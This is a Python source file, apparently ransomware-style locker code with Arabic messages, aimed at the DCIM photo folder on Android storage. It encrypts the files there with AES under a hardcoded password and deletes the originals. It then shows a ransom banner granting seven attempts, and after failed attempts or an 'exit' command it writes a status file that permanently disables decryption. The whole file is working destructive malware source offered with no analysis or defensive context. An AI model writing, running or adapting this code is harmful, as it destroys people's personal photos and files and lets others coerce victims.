# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import sys
import threading
import time
import math

class SDLock:
    def __init__(self):
        self.sd_path = "/storage/emulated/0"
        self.target_folder = os.path.join(self.sd_path, "DCIM")
        self.file_ext = ".locked"
        self.max_attempts = 7
        self.attempts = 0
        self.password = "yanal"
        self.key = self.password.ljust(32)[:32].encode('utf-8')
        self.lock_status_file = os.path.join(self.target_folder, ".lock_status")
        self.video_extensions = ['.mp4', '.avi', '.mov', '.mkv', '.flv']
        self.threads = []
        self.processed_files = 0
        self.total_files = 0
        self.start_time = 0
        self.lock = threading.Lock()

    def show_progress(self):
        """عرض شريط التقدم"""
        progress = self.processed_files / self.total_files
        bar_length = 40
        block = int(round(bar_length * progress))
        progress_percent = round(progress * 100, 2)
        
        elapsed_time = time.time() - self.start_time
        if self.processed_files > 0:
            remaining_time = (elapsed_time / self.processed_files) * (self.total_files - self.processed_files)
        else:
            remaining_time = 0
            
        text = "\rالتقدم: [{0}] {1}% | المتبقي: {2:.1f}ث | الملفات: {3}/{4}".format(
            "#" * block + "-" * (bar_length - block),
            progress_percent,
            remaining_time,
            self.processed_files,
            self.total_files
        )
        sys.stdout.write(text)
        sys.stdout.flush()

    def validate_folder(self):
        if not os.path.exists(self.target_folder):
            print("!المجلد المطلوب غير موجود")
            return False
        return True

    def process_files(self, mode):
        try:
            print("جاري التحضير...")
            files_to_process = []
            video_files = []
            
            for root, _, files in os.walk(self.target_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    if mode == "encrypt":
                        if not file.endswith(self.file_ext):
                            if any(file.lower().endswith(ext) for ext in self.video_extensions):
                                video_files.append(file_path)
                            else:
                                files_to_process.append(file_path)
                    elif mode == "decrypt":
                        if file.endswith(self.file_ext):
                            files_to_process.append(file_path)
            
            if video_files:
                print("!يوجد ملف لن يتم العمل عليه 🦅💚")
            
            self.total_files = len(files_to_process)
            self.processed_files = 0
            self.start_time = time.time()
            
            chunk_size = len(files_to_process) // 4 + 1
            chunks = [files_to_process[i:i + chunk_size] for i in range(0, len(files_to_process), chunk_size)]
            
            for i in range(4):
                if i < len(chunks):
                    t = threading.Thread(target=self.process_chunk, args=(chunks[i], mode, False))
                    self.threads.append(t)
                    t.start()
            
            # عرض شريط التقدم أثناء الانتظار
            while threading.active_count() > 1:
                with self.lock:
                    self.show_progress()
                time.sleep(0.1)
            
            for t in self.threads:
                t.join()
                
            print("\nتم الانتهاء من العملية!")
                
        except Exception as e:
            print(f"\nحدث خطأ: {e}")
            sys.exit()

    def process_chunk(self, files, mode, is_video):
        for file_path in files:
            if mode == "encrypt":
                self.encrypt_file(file_path, is_video)
            elif mode == "decrypt":
                self.decrypt_file(file_path)
            
            with self.lock:
                self.processed_files += 1

    def encrypt_file(self, path, is_video):
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CFB, iv)
            
            with open(path, 'rb') as f:
                plaintext = f.read()
            
            encrypted = iv + cipher.encrypt(plaintext)
            
            encrypted_path = path + self.file_ext
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
            
            os.remove(path)
        except Exception as e:
            print(f"\nحدث خطأ أثناء التشفير: {e}")

    def decrypt_file(self, path):
        try:
            with open(path, 'rb') as f:
                data = f.read()
            
            iv = data[:16]
            cipher = AES.new(self.key, AES.MODE_CFB, iv)
            decrypted = cipher.decrypt(data[16:])
            
            original_path = path.replace(self.file_ext, "")
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            os.remove(path)
        except Exception as e:
            print(f"\nحدث خطأ أثناء فك التشفير: {e}")

    def show_interface(self):
        ransom_msg = """
        ░██████╗██████╗░ ░█████╗░██╗░░░██╗
        ██╔════╝██╔══██╗ ██╔══██╗╚██╗░██╔╝
        ╚█████╗░██║░░██║ ██║░░██║░╚████╔╝░
        ░╚═══██╗██║░░██║ ██║░░██║░░╚██╔╝░░
        ██████╔╝██████╔╝ ╚█████╔╝░░░██║░░░
        ╚═════╝░╚═════╝░░ ╚════╝░░░░╚═╝░░░
        
        تم تشفير ملفاتك بنجاح. لديك 7 محاولات فقط.
        اكتب 'خروج' للحفاظ على تشفير الملفات
        """
        print(ransom_msg)

    def create_lock_status(self):
        with open(self.lock_status_file, 'w') as f:
            f.write("locked")

    def run(self):
        if not self.validate_folder():
            return

        encrypted_files = [f for f in os.listdir(self.target_folder) if f.endswith(self.file_ext)]

        if not encrypted_files:
            print("جاري تنفيذ العملية...")
            self.process_files("encrypt")

        self.show_interface()

        while self.attempts < self.max_attempts:
            user_input = input(f"المحاولة {self.attempts+1}/{self.max_attempts}: ").strip()
            
            if user_input == "خروج":
                print("!سيتم الحفاظ على تشفير الملفات")
                self.create_lock_status()
                sys.exit()
                
            elif user_input == self.password:
                if not os.path.exists(self.lock_status_file):
                    print("جاري استعادة الملفات...")
                    self.process_files("decrypt")
                    print("تمت الاستعادة بنجاح!")
                    if os.path.exists(self.lock_status_file):
                        os.remove(self.lock_status_file)
                    sys.exit()
                else:
                    print("!فك التشفير معطل")
                    sys.exit()
                
            else:
                self.attempts += 1
                print(f"!كلمة مرور خاطئة. المحاولات المتبقية: {self.max_attempts - self.attempts}")
        
        print("!تم تجاوز الحد الأقصى للمحاولات. الملفات مشفرة بشكل دائم")
        self.create_lock_status()

if __name__ == "__main__":
    SDLock().run()
